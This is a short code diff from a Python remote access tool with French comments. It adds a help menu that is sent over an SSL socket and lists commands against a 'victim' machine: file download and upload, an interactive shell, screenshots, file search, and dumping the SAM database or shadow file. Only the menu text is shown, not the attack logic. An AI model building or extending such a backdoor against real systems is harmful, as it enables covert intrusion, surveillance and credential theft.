@@ -9,7 +9,17 @@ SERVER_PORT = 8888
 
 # Fonction permettant d'envoyer la liste des commandes disponibles
 def menu_help(ssl_socket):
-    print('help')
+    # Sauvegarde des explications du menu d'aides
+    menu_help_to_send =  "[*] help        : afficher la liste des commandes disponibles.\n"
+    menu_help_to_send += "[*] download    : récupération de fichiers de la victime vers le serveur.\n"
+    menu_help_to_send += "[*] upload      : récupération de fichiers du serveur vers la victime.\n"
+    menu_help_to_send += "[*] shell       : ouvrir un shell (bash ou cmd) interactif.\n"
+    menu_help_to_send += "[*] ipconfig    : obtenir la configuration réseau de la machine victime.\n"
+    menu_help_to_send += "[*] screenshot  : prendre une capture d'écran de la machine victime.\n"
+    menu_help_to_send += "[*] search      : rechercher un fichier sur la machine victime.\n"
+    menu_help_to_send += "[*] hashdump    : récupérer la base SAM ou le fichier shadow de la machine.\n"
+    menu_help_to_send += "[*] exit        : quitter le programme et déconnexion de la machine victime."
+    ssl_socket.send(menu_help_to_send.encode()) # Envoie du menu d'aides au serveur
 
 # Fonction permettant de charger un fichier du serveur
 def download(ssl_socket):
